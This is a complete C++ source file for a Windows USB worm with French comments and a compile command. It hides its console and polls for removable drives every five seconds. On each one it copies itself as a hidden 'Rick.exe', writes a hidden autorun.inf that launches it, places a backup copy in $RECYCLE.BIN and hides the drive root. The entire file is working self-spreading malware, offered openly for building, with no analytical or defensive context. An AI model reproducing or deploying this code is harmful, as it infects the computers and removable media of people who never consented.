// language: C++17, file: src/tools/05_usb_worm.cpp, target: Windows 10/11, MSVC/MinGW
// USB worm - copie sur chaque lecteur amovible, autorun.inf, attributs caches
// MinGW: g++ -O2 -std=c++17 05_usb_worm.cpp -o usb.exe
#include <windows.h>
#include <cstdio>
#include <cstring>

static void Hide(const char* p) {
    SetFileAttributesA(p, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

static void InfectDrive(char letter) {
    char self[MAX_PATH];
    GetModuleFileNameA(NULL, self, MAX_PATH);

    char root[8]    = { letter, ':', '\\', 0 };
    char dest[MAX_PATH]; snprintf(dest, sizeof(dest), "%c:\\Rick.exe", letter);
    char destRec[MAX_PATH]; snprintf(destRec, sizeof(destRec), "%c:\\$RECYCLE.BIN\\Rick.exe", letter);
    char autorun[MAX_PATH]; snprintf(autorun, sizeof(autorun), "%c:\\autorun.inf", letter);

    // deja infecte ?
    DWORD attr = GetFileAttributesA(dest);
    if (attr != INVALID_FILE_ATTRIBUTES) return;

    if (CopyFileA(self, dest, FALSE)) {
        Hide(dest);
        FILE* f = fopen(autorun, "w");
        if (f) {
            fprintf(f, "[autorun]\nopen=Rick.exe\naction=RickPortal\nicon=Rick.exe,0\n");
            fclose(f);
            Hide(autorun);
        }
        // copie de secours dans $RECYCLE.BIN (dir deja cache par Windows)
        if (CopyFileA(self, destRec, FALSE)) Hide(destRec);
        SetFileAttributesA(root, GetFileAttributesA(root) | FILE_ATTRIBUTE_HIDDEN);
    }
}

int main() {
    FreeConsole();
    char drives[512];
    for (;;) {
        DWORD n = GetLogicalDriveStringsA(sizeof(drives) - 1, drives);
        for (DWORD i = 0; i < n && drives[i]; i += 4) {
            UINT type = GetDriveTypeA(drives + i);
            if (type == DRIVE_REMOVABLE || type == DRIVE_FIXED) {
                // amovible = cible principale; fixe = cle branchee en direct aussi
                if (type == DRIVE_REMOVABLE) InfectDrive(drives[i]);
            }
        }
        // sonde toutes les 5 s - une cle enfichee plus tard est attrapee
        Sleep(5000);
    }
    return 0;
}
